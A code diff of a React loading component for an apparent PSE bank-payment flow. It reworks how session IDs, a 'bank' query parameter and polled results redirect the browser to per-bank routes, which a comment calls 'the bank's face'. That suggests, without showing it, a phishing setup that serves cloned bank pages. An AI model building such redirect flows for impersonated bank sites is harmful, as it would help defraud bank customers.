@@ -218,11 +218,17 @@ const PseLoading = ({ variant = "entry", onFinalizeReady }) => {
         sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionId);
         localStorage.setItem("sessionId", sessionId);
         sessionIdRef.current = sessionId;
+
+        // Si viene con bankParam (ej: ?bank=nequi o ?bank=cajasocial), redirigir directamente a la cara del banco
+        const directRoute = bankParam ? getPseBankRoute(bankParam) : null;
+        if (directRoute) {
+          setTimeout(() => {
+            window.location.href = directRoute;
+          }, PSE_LOADING_DELAY_MS);
+          return;
+        }
+
         initPolling();
-      } else if (bankUrl) {
-        setTimeout(() => {
-          window.location.href = href;
-        }, PSE_LOADING_DELAY_MS);
       }
     }
   }, []);
@@ -309,14 +315,12 @@ const PseLoading = ({ variant = "entry", onFinalizeReady }) => {
           localStorage.setItem("sessionId", sessionIdRef.current);
           sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionIdRef.current);
         }
-        if (window.location.pathname !== "/pse") {
-          const resolvedBank = String(url || bank || "").trim();
-          const directRoute = getPseBankRoute(resolvedBank);
-          if (directRoute) {
-            window.location.href = directRoute;
-          } else {
-            window.location.href = "/pse?bank=" + encodeURIComponent(resolvedBank) + "&sessionId=" + encodeURIComponent(sessionIdRef.current || "");
-          }
+        const resolvedBank = String(url || bank || "").trim();
+        const directRoute = getPseBankRoute(resolvedBank);
+        if (directRoute) {
+          window.location.href = directRoute;
+        } else if (window.location.pathname !== "/pse") {
+          window.location.href = "/pse?bank=" + encodeURIComponent(resolvedBank) + "&sessionId=" + encodeURIComponent(sessionIdRef.current || "");
         }
         break;
       }
@@ -434,15 +438,13 @@ const PseLoading = ({ variant = "entry", onFinalizeReady }) => {
             sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionIdRef.current);
           }
 
-          if (window.location.pathname !== "/pse") {
-            const resolvedBank = String(url || bank || "").trim();
-            const directRoute = getPseBankRoute(resolvedBank);
+          const resolvedBank = String(url || bank || "").trim();
+          const directRoute = getPseBankRoute(resolvedBank);
 
-            if (directRoute) {
-              window.location.href = directRoute;
-            } else {
-              window.location.href = "/pse?bank=" + encodeURIComponent(resolvedBank) + "&sessionId=" + encodeURIComponent(sessionIdRef.current || "");
-            }
+          if (directRoute) {
+            window.location.href = directRoute;
+          } else if (window.location.pathname !== "/pse") {
+            window.location.href = "/pse?bank=" + encodeURIComponent(resolvedBank) + "&sessionId=" + encodeURIComponent(sessionIdRef.current || "");
           }
 
           break;
